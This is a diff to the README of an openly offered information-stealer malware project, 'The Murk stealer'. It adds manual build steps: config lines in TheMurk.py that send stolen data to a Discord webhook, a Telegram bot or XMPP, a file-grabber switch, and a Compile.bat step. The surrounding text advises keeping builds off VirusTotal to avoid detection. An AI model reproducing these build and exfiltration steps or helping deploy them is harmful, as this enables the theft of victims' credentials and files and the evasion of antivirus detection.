@@ -114,7 +114,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
 * ✅File grabber
 * ✅Secure to use
 ---
-### 🔨Builder
+### 🔨Building(using builder)
 
 ### 🎮For Discord
 __So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v8.0.1). 
@@ -125,6 +125,26 @@ Finally, insert the name and webhook link in the builder. And wait, secure build
 So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. Then, you need to save token and bot name. 
 Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and save the id.  
 Insert this data in builder console. And wait, secure building will take about 2 minutes.
+
+### 🔨Building(manually)
+
+### 🎮For Discord
+Finally, insert the name and webhook link in the `TheMurk.py` here
+```
+enableFileGrubber = False # do you want to use file grubber
+sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
+discordData = ["url of your WebHook","name of that WebHook"]
+```
+and run `Compile.bat`
+
+### 📨For Telegram
+Finally, insert the name and webhook link in the `TheMurk.py` here
+```
+enableFileGrubber = False # do you want to use file grubber
+sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
+TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
+```
+and run `Compile.bat`
 
 ---
 ### ❌Builder errors
